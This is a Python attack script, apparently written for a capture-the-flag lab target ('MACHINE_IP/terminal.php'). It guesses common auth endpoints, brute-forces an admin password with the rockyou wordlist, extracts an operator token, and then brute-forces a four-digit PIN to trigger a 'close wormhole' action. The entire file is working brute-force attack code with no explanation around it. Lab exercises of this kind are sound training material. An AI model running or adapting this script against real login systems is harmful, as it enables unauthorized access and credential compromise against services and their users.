import requests
import sys
import re
import random

# Configuration
target_url = 'http://MACHINE_IP/terminal.php'
rockyou_path = '/usr/share/wordlists/rockyou.txt'
pin_range = range(4000, 5000)

# Step 1: Identify endpoints
def discover_endpoints(url):
    print("[*] Discovering endpoints...")
    endpoints = []
    # Common endpoint patterns
    patterns = [
        '/action/login',
        '/action/auth',
        '/action/validate',
        '/api/token',
        '/api/auth',
        '/admin/token'
    ]
    
    for pattern in patterns:
        full_url = url + pattern
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                endpoints.append(full_url)
                print(f"[+] Found endpoint: {full_url}")
        except Exception as e:
            print(f"[-] Error accessing {full_url}: {e}")
    
    return endpoints

# Step 2: Brute force authentication
def brute_force_auth(endpoints, username, rockyou_path):
    print("[*] Starting brute force attack...")
    with open(rockyou_path, 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            for endpoint in endpoints:
                try:
                    payload = {'username': username, 'password': password}
                    response = requests.post(endpoint, data=payload)
                    
                    # Check for success conditions
                    if "success" in response.text.lower() or "welcome" in response.text.lower():
                        print(f"[+] Authentication successful with password: {password}")
                        return password, endpoint
                except Exception as e:
                    print(f"[-] Error with {endpoint}: {e}")
    return None, None

# Step 3: Obtain operator token
def get_operator_token(endpoint, username, password):
    print("[*] Obtaining operator token...")
    token_endpoint = endpoint.replace('login', 'token').replace('auth', 'token')
    
    try:
        payload = {'username': username, 'password': password}
        response = requests.post(token_endpoint, data=payload)
        
        # Extract token from response
        match = re.search(r'"token":\s*"([^"]+)"', response.text)
        if match:
            token = match.group(1)
            print(f"[+] Operator token obtained: {token}")
            return token
        else:
            print("[-] Failed to extract token")
    except Exception as e:
        print(f"[-] Error getting token: {e}")
    
    return None

# Step 4: Call close operation
def call_close_operation(endpoint, token, pin_range):
    print("[*] Calling close operation...")
    close_endpoint = endpoint.replace('token', 'close')
    
    for pin in pin_range:
        try:
            payload = {
                'token': token,
                'pin': str(pin)
            }
            response = requests.post(close_endpoint, data=payload)
            
            if response.status_code == 200 and "success" in response.text.lower():
                print(f"[+] Successfully closed wormhole with PIN: {pin}")
                return True
        except Exception as e:
            print(f"[-] Error with PIN {pin}: {e}")
    
    print("[-] Failed to close wormhole")
    return False

# Main function
def main():
    endpoints = discover_endpoints(target_url)
    if not endpoints:
        print("[-] No endpoints discovered")
        return
    
    username = "admin"
    password, auth_endpoint = brute_force_auth(endpoints, username, rockyou_path)
    if not password:
        print("[-] Authentication failed")
        return
    
    token = get_operator_token(auth_endpoint, username, password)
    if not token:
        print("[-] Failed to get operator token")
        return
    
    success = call_close_operation(auth_endpoint, token, pin_range)
    if success:
        print("[+] Wormhole successfully closed!")
    else:
        print("[-] Failed to close wormhole")

if __name__ == "__main__":
    main()
